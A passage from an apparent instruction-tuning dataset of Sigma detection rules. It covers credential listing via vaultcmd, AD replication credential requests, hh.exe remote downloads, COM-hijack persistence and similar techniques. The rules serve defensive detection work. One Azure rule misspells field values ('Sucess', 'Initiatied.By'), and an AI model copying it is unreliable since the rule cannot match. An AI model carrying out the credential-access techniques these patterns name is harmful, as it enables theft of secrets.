    "instruction": "Build a Sigma rule with the goal of detecting commandline containing reference to files ending with a \".\" This scheme has been seen used by raspberry-robin.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect commandline containing reference to files ending with a \".\", which has been seen used by raspberry-robin, you should monitor the creation of processes on Windows systems. Specifically, focus on the command lines that include references to files that end with a period followed by 1 to 6 characters but do not match at the end of the line due to potential false positives with bind DNS notation. This detection strategy is considered high priority due to the risk associated with the observed behavior.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Example 1: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-3f-raspberryrobin-runonce.png\n        # Example 2: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-5f-odbcconf.png\n        # Example 3: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-6f-fauppod-command-line.png\n        CommandLine|re: \\\\[a-zA-Z0-9]{1,32}\\.[a-zA-Z0-9]{1,6}\\.[ \"']{1}  # cannot match on end-of-line because of FPs with bind DNS notation\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Example 1: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-3f-raspberryrobin-runonce.png\n        # Example 2: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-5f-odbcconf.png\n        # Example 3: https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/fig-6f-fauppod-command-line.png\n        CommandLine|re: \\\\[a-zA-Z0-9]{1,32}\\.[a-zA-Z0-9]{1,6}\\.[ \"']{1}  # cannot match on end-of-line because of FPs with bind DNS notation\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "commandline containing reference to files ending with a \".\" This scheme has been seen used by raspberry-robin",
      "answer": "In order to detect commandline containing reference to files ending with a \".\", which has been seen used by raspberry-robin, you should monitor the creation of processes on Windows systems. Specifically, focus on the command lines that include references to files that end with a period followed by 1 to 6 characters but do not match at the end of the line due to potential false positives with bind DNS notation. This detection strategy is considered high priority due to the risk associated with the observed behavior."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to find domain-level groups and permission settings.\nThe knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activities where adversaries attempt to find domain-level groups and permission settings, a focus is placed on monitoring PowerShell module logs within Windows environments. The monitoring targets two principal behaviors:\n\n1. The use of the `get-ADPrincipalGroupMembership` command, which may be observed in the payload or context information of the logs. This command is indicative of attempts to query the groups that a user or other Active Directory principal belongs to.\n\n2. The execution of the `get-aduser` command with specific parameters: `-f`, `-pr`, and the inclusion of `DoesNotRequirePreAuth`. These parameters together are used to query Active Directory for user objects that match certain criteria, without requiring pre-authentication. The presence of these parameters in both the payload and context information is a critical indicator of an attempt to enumerate user objects with specific attributes or permissions.\n\nLogs showing these patterns should be closely examined, although it is important to consider that these commands may also be used legitimately by administrators for script-based management tasks. As a result, the identified activities are categorized with a low level of confidence in terms of malicious intent. \n\nTo effectively manage this threat, organizations should look for the aforementioned commands and parameters in their PowerShell module logs, understand the context in which these commands are executed, and consider the information being sought through these queries. The detection strategy is centered around the possibility that adversaries may be trying to determine the structure of domain-level groups, identify users with elevated permissions, or both, as part of their reconnaissance or lateral movement phases within a targeted environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_ad_principal:\n        - Payload|contains: 'get-ADPrincipalGroupMembership'\n        - ContextInfo|contains: 'get-ADPrincipalGroupMembership'\n    selection_get_aduser:\n        - Payload|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n        - ContextInfo|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_ad_principal:\n        - Payload|contains: 'get-ADPrincipalGroupMembership'\n        - ContextInfo|contains: 'get-ADPrincipalGroupMembership'\n    selection_get_aduser:\n        - Payload|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n        - ContextInfo|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n    condition: 1 of selection_*\nfalsepositives:\n    - Administrator script\nlevel: low\n",
      "question": "Adversaries may attempt to find domain-level groups and permission settings.\nThe knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n",
      "answer": "In order to detect activities where adversaries attempt to find domain-level groups and permission settings, a focus is placed on monitoring PowerShell module logs within Windows environments. The monitoring targets two principal behaviors:\n\n1. The use of the `get-ADPrincipalGroupMembership` command, which may be observed in the payload or context information of the logs. This command is indicative of attempts to query the groups that a user or other Active Directory principal belongs to.\n\n2. The execution of the `get-aduser` command with specific parameters: `-f`, `-pr`, and the inclusion of `DoesNotRequirePreAuth`. These parameters together are used to query Active Directory for user objects that match certain criteria, without requiring pre-authentication. The presence of these parameters in both the payload and context information is a critical indicator of an attempt to enumerate user objects with specific attributes or permissions.\n\nLogs showing these patterns should be closely examined, although it is important to consider that these commands may also be used legitimately by administrators for script-based management tasks. As a result, the identified activities are categorized with a low level of confidence in terms of malicious intent. \n\nTo effectively manage this threat, organizations should look for the aforementioned commands and parameters in their PowerShell module logs, understand the context in which these commands are executed, and consider the information being sought through these queries. The detection strategy is centered around the possibility that adversaries may be trying to determine the structure of domain-level groups, identify users with elevated permissions, or both, as part of their reconnaissance or lateral movement phases within a targeted environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting accounts that are created or deleted by non-approved users..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect accounts that are created or deleted by non-approved users, you should: Monitor the Azure audit logs to identify events where users are added or deleted, ensuring these actions are successful. Focus specifically on the `properties.message` field for occurrences of \"Add user\" or \"Delete user\" activities. Additionally, verify if the initiated action was performed by someone other than those listed in `%ApprovedUserUpn%`, indicating they're not recognized as legitimate administrators for these sensitive operations. This approach helps in filtering out authorized administrative activities, which could be considered as false positives such as legitimate user management actions by approved personnel. The importance of this process lies in its ability to flag potentially unauthorized or malicious attempts to modify user account lists, aligning with medium-level security concerns. The associated tags include tactics and techniques related to Initial Access and Persistence by managing accounts in a way that could facilitate unauthorized access or maintain persistent control over a compromised environment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message:\n            - Add user\n            - Delete user\n        Status: Sucess\n    valid_admin:\n        Initiatied.By: '%ApprovedUserUpn%'\n    condition: selection and not valid_admin\nfalsepositives:\n    - Legit administrative action\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message:\n            - Add user\n            - Delete user\n        Status: Sucess\n    valid_admin:\n        Initiatied.By: '%ApprovedUserUpn%'\n    condition: selection and not valid_admin\nfalsepositives:\n    - Legit administrative action\nlevel: medium\n",
      "question": "accounts that are created or deleted by non-approved users.",
      "answer": "In order to detect accounts that are created or deleted by non-approved users, you should: Monitor the Azure audit logs to identify events where users are added or deleted, ensuring these actions are successful. Focus specifically on the `properties.message` field for occurrences of \"Add user\" or \"Delete user\" activities. Additionally, verify if the initiated action was performed by someone other than those listed in `%ApprovedUserUpn%`, indicating they're not recognized as legitimate administrators for these sensitive operations. This approach helps in filtering out authorized administrative activities, which could be considered as false positives such as legitimate user management actions by approved personnel. The importance of this process lies in its ability to flag potentially unauthorized or malicious attempts to modify user account lists, aligning with medium-level security concerns. The associated tags include tactics and techniques related to Initial Access and Persistence by managing accounts in a way that could facilitate unauthorized access or maintain persistent control over a compromised environment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an ElastiCache security group has been created..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an ElastiCache security group has been created, you should monitor AWS CloudTrail logs for events where a new ElastiCache security group is created. Specifically, look for the event source \"elasticache.amazonaws.com\" combined with the event name \"CreateCacheSecurityGroup.\" It's important to note that while some of these events could be flagged, not all instances are malicious. Often, a system or network administrator might legitimately create an ElastiCache security group as part of routine operations. Therefore, it's crucial to check whether the creation comes from expected users, using known user agents, or occurs from known hosts within your environment. Any creation activity from unfamiliar sources should prompt an investigation. To minimize distractions from alerts that are not actual threats, known legitimate behavior causing alerts can be configured to bypass or be exempted from monitoring under this specific criterion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName: 'CreateCacheSecurityGroup'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group may be created by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security group creations from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: elasticache.amazonaws.com\n        eventName: 'CreateCacheSecurityGroup'\n    condition: selection\nfalsepositives:\n    - A ElastiCache security group may be created by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security group creations from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\n\n\nlevel: low\n",
      "question": "when an ElastiCache security group has been created.",
      "answer": "In order to detect when an ElastiCache security group has been created, you should monitor AWS CloudTrail logs for events where a new ElastiCache security group is created. Specifically, look for the event source \"elasticache.amazonaws.com\" combined with the event name \"CreateCacheSecurityGroup.\" It's important to note that while some of these events could be flagged, not all instances are malicious. Often, a system or network administrator might legitimately create an ElastiCache security group as part of routine operations. Therefore, it's crucial to check whether the creation comes from expected users, using known user agents, or occurs from known hosts within your environment. Any creation activity from unfamiliar sources should prompt an investigation. To minimize distractions from alerts that are not actual threats, known legitimate behavior causing alerts can be configured to bypass or be exempted from monitoring under this specific criterion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect possible persistence using Fax DLL load when service restart.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible persistence using Fax DLL load when service restart, you should:\nMonitor Windows registry settings particularly related to service restart mechanisms. Specifically, focus on registry entries modification under the '\\Software\\Microsoft\\Fax\\Device Providers\\' path. Look for any changes that include the '\\ImageName' value. This observation points out an attempt to achieve persistence by exploiting Fax services, commonly overlooked in Windows environments. However, to reduce false positives and ensure accuracy, it's essential to exclude any modifications that involve the '%systemroot%\\system32\\fxst30.dll', as this is a legitimate usage scenario on Windows 10 systems. Given the high potential impact of such persistence techniques, any deviations from normal behavior under these parameters should be treated with heightened scrutiny. This detection is aligned with recognized attack tactics focusing on achieving persistence through manipulation of system processes or services.\n",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\Software\\Microsoft\\Fax\\Device Providers\\'\n            - '\\ImageName'\n    filter:\n        Details: '%systemroot%\\system32\\fxst30.dll' #Windows 10\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        TargetObject|contains|all:\n            - '\\Software\\Microsoft\\Fax\\Device Providers\\'\n            - '\\ImageName'\n    filter:\n        Details: '%systemroot%\\system32\\fxst30.dll' #Windows 10\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detect possible persistence using Fax DLL load when service restart",
      "answer": "In order to detect possible persistence using Fax DLL load when service restart, you should:\nMonitor Windows registry settings particularly related to service restart mechanisms. Specifically, focus on registry entries modification under the '\\Software\\Microsoft\\Fax\\Device Providers\\' path. Look for any changes that include the '\\ImageName' value. This observation points out an attempt to achieve persistence by exploiting Fax services, commonly overlooked in Windows environments. However, to reduce false positives and ensure accuracy, it's essential to exclude any modifications that involve the '%systemroot%\\system32\\fxst30.dll', as this is a legitimate usage scenario on Windows 10 systems. Given the high potential impact of such persistence techniques, any deviations from normal behavior under these parameters should be treated with heightened scrutiny. This detection is aligned with recognized attack tactics focusing on achieving persistence through manipulation of system processes or services.\n"
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to list credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe, you should: Monitor the creation of processes on Windows systems, focusing on the execution of the `vaultcmd.exe` utility. Specifically, look for processes where the image name ends with `\\VaultCmd.exe` or has an original file name of `VAULTCMD.EXE`. Additionally, pay attention to the command line parameters used with these processes, especially for the use of `/listcreds:` argument, which is utilized to list credentials. These activities are indicative of attempts to access or manipulate the Windows Credential Manager, which aligns with techniques for credential access. The level of concern for these activities is considered medium, though be aware that some legitimate actions may trigger this detection, though such instances are currently unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\VaultCmd.exe'\n        - OriginalFileName: 'VAULTCMD.EXE'\n    selection_cli:\n        CommandLine|contains: '/listcreds:'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe",
      "answer": "In order to list credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe, you should: Monitor the creation of processes on Windows systems, focusing on the execution of the `vaultcmd.exe` utility. Specifically, look for processes where the image name ends with `\\VaultCmd.exe` or has an original file name of `VAULTCMD.EXE`. Additionally, pay attention to the command line parameters used with these processes, especially for the use of `/listcreds:` argument, which is utilized to list credentials. These activities are indicative of attempts to access or manipulate the Windows Credential Manager, which aligns with techniques for credential access. The level of concern for these activities is considered medium, though be aware that some legitimate actions may trigger this detection, though such instances are currently unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files, you should: Monitor the creation of processes on Windows systems, focusing on events where the process executed is identified either by its original file name \"HH.exe\" or by its image path ending with \"\\hh.exe\". Additionally, scrutinize the command line arguments of these processes for the presence of \"http\" indicating the execution or download of content from a remote location. This monitoring strategy is essential for identifying attempts to misuse the HTML Help executable to execute or retrieve malicious \".chm\" files from the internet. The critical nature of such activities warrants a high alert level due to their potential use in malicious campaigns.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: 'http'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files.",
      "answer": "In order to detect the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files, you should: Monitor the creation of processes on Windows systems, focusing on events where the process executed is identified either by its original file name \"HH.exe\" or by its image path ending with \"\\hh.exe\". Additionally, scrutinize the command line arguments of these processes for the presence of \"http\" indicating the execution or download of content from a remote location. This monitoring strategy is essential for identifying attempts to misuse the HTML Help executable to execute or retrieve malicious \".chm\" files from the internet. The critical nature of such activities warrants a high alert level due to their potential use in malicious campaigns."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags, you should: monitor process creation logs on Windows systems for the execution of `wuauclt.exe` without the presence of any command line flags. This involves looking for events where either the image path ends with `\\Wuauclt.exe`, the original file name is exactly `Wuauclt.exe`, or the command line ends with `\\Wuauclt.exe` but does not include additional command line arguments. Such activities, without the use of any command line flags, are considered highly unusual and could indicate a malicious attempt to mimic the Windows Update Agent for nefarious purposes. It is important to note, however, that since the detection strategy can potentially yield unknown false positives, any alert should be carefully investigated for confirmation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith: '\\Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Wuauclt.exe'\n        - OriginalFileName: 'Wuauclt.exe'\n    selection_cli:\n        CommandLine|endswith: '\\Wuauclt.exe'\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags",
      "answer": "In order to detect suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags, you should: monitor process creation logs on Windows systems for the execution of `wuauclt.exe` without the presence of any command line flags. This involves looking for events where either the image path ends with `\\Wuauclt.exe`, the original file name is exactly `Wuauclt.exe`, or the command line ends with `\\Wuauclt.exe` but does not include additional command line arguments. Such activities, without the use of any command line flags, are considered highly unusual and could indicate a malicious attempt to mimic the Windows Update Agent for nefarious purposes. It is important to note, however, that since the detection strategy can potentially yield unknown false positives, any alert should be carefully investigated for confirmation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the PSFactory COM InProcServer32 registry, a technique used by RomCom to create persistence by storing a malicious DLL, you should: Focus on monitoring registry modifications, specifically focusing on the Windows platform. The key aspect of this detection approach involves identifying events where the \"SetValue\" operation is carried out on registry keys. Specifically, the registry key to watch is the one ending with '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'. However, to avoid false alarms and ensure the accuracy of detection, modifications involving the standard Windows path to 'ActXPrxy.dll', being either '%windir%\\System32\\ActXPrxy.dll' or 'C:\\Windows\\System32\\ActXPrxy.dll', should not trigger alerts. These paths represent legitimate events that are not indicative of the malicious activity described. The absence of known benign activities causing similar changes creates an uncertainty around potential false positives, thereby warranting a high level of scrutiny for any alerts generated based on these criteria. This focused approach is essential for identifying attempts to achieve persistence by inserting a malicious DLL, a method commonly associated with sophisticated cyber threats like RomCom, within targeted systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'\n    filter_main:\n        Details:\n            - '%windir%\\System32\\ActXPrxy.dll'\n            - 'C:\\Windows\\System32\\ActXPrxy.dll'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'\n    filter_main:\n        Details:\n            - '%windir%\\System32\\ActXPrxy.dll'\n            - 'C:\\Windows\\System32\\ActXPrxy.dll'\n    condition: selection and not filter_main\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "changes to the PSFactory COM InProcServer32 registry. This technique was used by RomCom to create persistence storing a malicious DLL.",
      "answer": "In order to detect changes to the PSFactory COM InProcServer32 registry, a technique used by RomCom to create persistence by storing a malicious DLL, you should: Focus on monitoring registry modifications, specifically focusing on the Windows platform. The key aspect of this detection approach involves identifying events where the \"SetValue\" operation is carried out on registry keys. Specifically, the registry key to watch is the one ending with '\\CLSID\\{c90250f3-4d7d-4991-9b69-a5c5bc1c2ae6}\\InProcServer32\\(Default)'. However, to avoid false alarms and ensure the accuracy of detection, modifications involving the standard Windows path to 'ActXPrxy.dll', being either '%windir%\\System32\\ActXPrxy.dll' or 'C:\\Windows\\System32\\ActXPrxy.dll', should not trigger alerts. These paths represent legitimate events that are not indicative of the malicious activity described. The absence of known benign activities causing similar changes creates an uncertainty around potential false positives, thereby warranting a high level of scrutiny for any alerts generated based on these criteria. This focused approach is essential for identifying attempts to achieve persistence by inserting a malicious DLL, a method commonly associated with sophisticated cyber threats like RomCom, within targeted systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials, you should monitor Windows security event logs for event ID 4662 with an AccessMask of '0x100'. This event ID indicates an attempt to perform operations that may involve Active Directory object access. Specifically, focus on attempts that involve access to certain properties identified by their unique GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', and '89e95b76-444d-4c62-991a-0facbeda640c'), which are critical in the context of ADRS abuse. \n\nEnsure that these observations are not coming from accounts that end with a '$' sign or start with 'MSOL_', as these are typically associated with machine or specific service accounts which are commonly excluded to reduce false positives. Instead, focus on activities initiated by user accounts that do not fall under these filters. \n\nFor accurate detection, capture fields such as ComputerName, SubjectDomainName, and SubjectUserName to help in the investigation process and attribute the actions to specific accounts and machines. It's important to be aware of the potential for unknown false positives, which signifies the criticality of contextual investigation and validation of each detection to ensure they truly represent malicious activity and not legitimate administrative operations. This detection mechanism is pivotal in identifying unauthorized attempts to exploit the Active Directory Replication Service for credential access, which aligns with defense tactics against credential access attempts leveraging directory services.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        - SubjectUserName|endswith: '$'\n        - SubjectUserName|startswith: 'MSOL_' #https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662\n        AccessMask: '0x100'\n        Properties|contains:\n            - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'\n            - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'\n            - '89e95b76-444d-4c62-991a-0facbeda640c'\n    filter:\n        - SubjectUserName|endswith: '$'\n        - SubjectUserName|startswith: 'MSOL_' #https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions#ad-ds-connector-account\n    condition: selection and not filter\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.",
      "answer": "In order to detect potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials, you should monitor Windows security event logs for event ID 4662 with an AccessMask of '0x100'. This event ID indicates an attempt to perform operations that may involve Active Directory object access. Specifically, focus on attempts that involve access to certain properties identified by their unique GUIDs ('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', and '89e95b76-444d-4c62-991a-0facbeda640c'), which are critical in the context of ADRS abuse. \n\nEnsure that these observations are not coming from accounts that end with a '$' sign or start with 'MSOL_', as these are typically associated with machine or specific service accounts which are commonly excluded to reduce false positives. Instead, focus on activities initiated by user accounts that do not fall under these filters. \n\nFor accurate detection, capture fields such as ComputerName, SubjectDomainName, and SubjectUserName to help in the investigation process and attribute the actions to specific accounts and machines. It's important to be aware of the potential for unknown false positives, which signifies the criticality of contextual investigation and validation of each detection to ensure they truly represent malicious activity and not legitimate administrative operations. This detection mechanism is pivotal in identifying unauthorized attempts to exploit the Active Directory Replication Service for credential access, which aligns with defense tactics against credential access attempts leveraging directory services."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect well-known TAP software installation, possibly as preparation for data exfiltration using tunneling techniques, you should monitor driver load logs on Windows systems. Look for events where the 'ImagePath' field contains the specific string 'tap0901,' which is commonly associated with TAP drivers used by VPN software like OpenVPN. It's important to note that encountering this evidence does not immediately signify a threat, as it could also represent a legitimate installation of OpenVPN TAP drivers. However, these instances are flagged at a medium severity level due to their potential link to preparing systems for data exfiltration through tunneling.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|contains: 'tap0901'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: driver_load\ndetection:\n    selection:\n        ImagePath|contains: 'tap0901'\n    condition: selection\nfalsepositives:\n    - Legitimate OpenVPN TAP insntallation\nlevel: medium\n",
      "question": "Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques",
      "answer": "In order to detect well-known TAP software installation, possibly as preparation for data exfiltration using tunneling techniques, you should monitor driver load logs on Windows systems. Look for events where the 'ImagePath' field contains the specific string 'tap0901,' which is commonly associated with TAP drivers used by VPN software like OpenVPN. It's important to note that encountering this evidence does not immediately signify a threat, as it could also represent a legitimate installation of OpenVPN TAP drivers. However, these instances are flagged at a medium severity level due to their potential link to preparing systems for data exfiltration through tunneling."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting attempts to use screencapture to collect macOS screenshots.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts to use screencapture to collect macOS screenshots, you should monitor the creation of processes on macOS systems, specifically focusing on instances where the screencapture utility, located at '/usr/sbin/screencapture', is executed. This activity can be indicative of an attempt to capture the content displayed on the user's screen, potentially for malicious purposes. Keep in mind that there may be legitimate reasons for users to take screenshots, which should be considered as potential false positives. The severity of this type of activity is generally low, but it should not be ignored as it may represent a technique used in the initial stages of an attack to gather information.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        Image: '/usr/sbin/screencapture'\n    condition: selection\nfalsepositives:\n    - Legitimate user activity taking screenshots\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection:\n        Image: '/usr/sbin/screencapture'\n    condition: selection\nfalsepositives:\n    - Legitimate user activity taking screenshots\nlevel: low\n",
      "question": "attempts to use screencapture to collect macOS screenshots",
